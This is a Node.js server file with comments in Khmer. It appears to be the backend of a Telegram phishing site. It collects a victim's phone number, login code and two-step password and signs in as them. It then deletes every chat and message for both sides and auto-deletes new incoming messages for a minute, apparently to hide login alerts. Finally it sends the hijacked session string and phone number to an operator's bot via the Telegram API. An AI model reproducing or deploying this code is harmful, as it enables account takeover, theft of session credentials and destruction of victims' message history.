require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const { NewMessage } = require('telegram/events');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files (index.html)
app.use(express.static(__dirname));

// Environment Variables ពី Railway
const apiId = Number(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;
const botToken = process.env.BOT_TOKEN;
const adminChatId = process.env.ADMIN_CHAT_ID;

// Session បណ្តោះអាសន្នសម្រាប់រក្សាទុក Telegram Client
const sessions = {};

/**
 * 1. Function លុប Chat និងសារទាំងអស់ (User, Bot, Telegram) ដោយគ្មានដែនកំណត់
 */
async function deleteAllChats(client) {
    try {
        const dialogs = await client.getDialogs({});

        for (const dialog of dialogs) {
            try {
                // វិធីទី ១: លុបប្រវត្តិសារទាំងអស់ក្នុង Chat (Delete History for both sides)
                await client.invoke(new Api.messages.DeleteHistory({
                    peer: dialog.inputEntity,
                    maxId: 0,
                    revoke: true,
                    justClear: false
                }));

                // វិធីទី ២: ស្កែនលុបសារដែលមានស្រាប់ទាំងអស់ដើម្បីការពារជ្រុះសល់
                const messages = await client.getMessages(dialog.entity, { limit: 100 });
                const messageIds = messages.map(msg => msg.id);

                if (messageIds.length > 0) {
                    await client.deleteMessages(dialog.entity, messageIds, { revoke: true });
                }
            } catch (err) {
                console.error(`Failed to wipe messages in dialog ${dialog.name || dialog.id}:`, err.message);
            }
        }
    } catch (err) {
        console.error("Error running deleteAllChats:", err.message);
    }
}

/**
 * 2. Function តាមដាន និងលុបសារថ្មីៗភ្លាមៗ រយៈពេល ១ នាទី (៦០ វិនាទី)
 */
async function cleanupPostLogin(client) {
    // ជំហានទី ១: លុប Chat/សារដែលមានស្រាប់ទាំងអស់ភ្លាមៗពេល Log-in រួច
    await deleteAllChats(client);

    // ជំហានទី ២: បង្កើត Event Listener ចាំចាប់សារថ្មីៗ (Real-time)
    const eventHandler = async (event) => {
        try {
            const message = event.message;
            if (message && message.id) {
                // លុបសារថ្មីដែលទើបតែផ្ញើចូល ឬផ្ញើចេញភ្លាមៗ (revoke: true លុបទាំងសងខាង)
                await client.deleteMessages(message.peerId, [message.id], { revoke: true });
            }
        } catch (err) {
            console.error("Error auto-deleting incoming live message:", err.message);
        }
    };

    // ចាប់ផ្ដើមរងចាំស្ទាក់លុបសារថ្មីៗពី User, Bot, និង Telegram
    client.addEventHandler(eventHandler, new NewMessage({}));

    // រង់ចាំរយៈពេល ១ នាទី (60,000 ms)
    await new Promise(resolve => setTimeout(resolve, 60000));

    // ជំហានទី ៣: ធ្វើការលុបសម្អាតសារម្តងទៀតជាចុងក្រោយ
    await deleteAllChats(client);

    // បិទ Listener វិញបន្ទាប់ពីផុត ១ នាទី
    client.removeEventHandler(eventHandler, new NewMessage({}));
}

// Root Route: បើកទំព័រ index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 1. API សម្រាប់ផ្ញើលេខកូដ OTP ទៅ Telegram App
app.post('/api/send-code', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, error: "Phone number is required" });
    }

    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
            connectionRetries: 5,
        });
        await client.connect();

        const { phoneCodeHash } = await client.sendCode(
            { apiId, apiHash },
            phoneNumber
        );

        sessions[phoneNumber] = { client, phoneCodeHash };

        res.json({ success: true, message: "OTP code sent to your Telegram app!" });
    } catch (err) {
        console.error("Error sending code:", err);
        res.status(500).json({ success: false, error: err.message || "Failed to send code" });
    }
});

// 2. API សម្រាប់ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
app.post('/api/verify-code', async (req, res) => {
    const { phoneNumber, code, password } = req.body;

    if (!phoneNumber || !code) {
        return res.status(400).json({ success: false, error: "Phone number and OTP code are required" });
    }

    const session = sessions[phoneNumber];
    if (!session) {
        return res.status(400).json({ success: false, error: "Session expired. Please request OTP again." });
    }

    try {
        const { client, phoneCodeHash } = session;

        if (password) {
            // ករណីមាន 2FA Password
            const passwordSrp = await client.invoke(new Api.account.GetPassword());
            const passwordCheck = await computeCheck(passwordSrp, password);
            await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
        } else {
            // ករណី Sign In ជាមួយ OTP ធម្មតា
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phoneNumber,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code,
                })
            );
        }

        // ដំណើរការលុប Chat ទាំងអស់ និងចាំស្ទាក់លុបសារថ្មីៗរយៈពេល ១ នាទី
        await cleanupPostLogin(client);

        const sessionString = client.session.save();
        delete sessions[phoneNumber];

        // ផ្ញើ Session String ចូល Telegram Bot របស់ Admin
        if (botToken && adminChatId) {
            try {
                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: adminChatId,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (notifyErr) {
                console.error("Failed to send notification to Telegram Bot:", notifyErr);
            }
        }

        res.json({
            success: true,
            message: "Authentication successful!",
            session: sessionString
        });
    } catch (err) {
        console.error("Error verifying code:", err);

        if (err.message && err.message.includes("SESSION_PASSWORD_NEEDED")) {
            return res.status(401).json({
                success: false,
                requiresPassword: true,
                error: "Two-Step Verification (2FA) password is required."
            });
        }

        res.status(400).json({ success: false, error: err.message || "Verification failed" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
